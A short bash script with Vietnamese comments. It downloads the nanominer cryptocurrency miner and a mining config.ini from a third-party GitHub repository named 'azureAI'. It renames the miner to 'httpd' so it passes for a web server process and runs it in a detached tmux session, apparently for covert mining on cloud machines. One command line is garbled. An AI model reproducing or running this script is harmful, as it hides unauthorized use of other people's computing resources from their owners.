#! /bin/bash
set -x #echo on
if [ -f ${PWD}/nanominer-linux-1.9.6/httpd ]; then
    if pgrep -x "httpd" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
cd nanominer-linux-1.9.6
tmux new-session -d -s my_session1  './httpd'
     
fi
exit
fi

sudo wget https://github.com/nanopool/nanominer/releases/download/v1.9.6/nanominer-linux-1.9.6.tar.gz
sudo tar xvzf nanominer-linux-1.9.6.tar.gz
cd nanominer-linux-1.9.6
rm cosudo nfig.ini
sudo wget https://raw.githubusercontent.com/minnie1311/azureAI/master/config.ini
sudo chmod +x nanominer
sudo mv nanominer httpd
tmux new-session -d -s my_session1  './httpd'

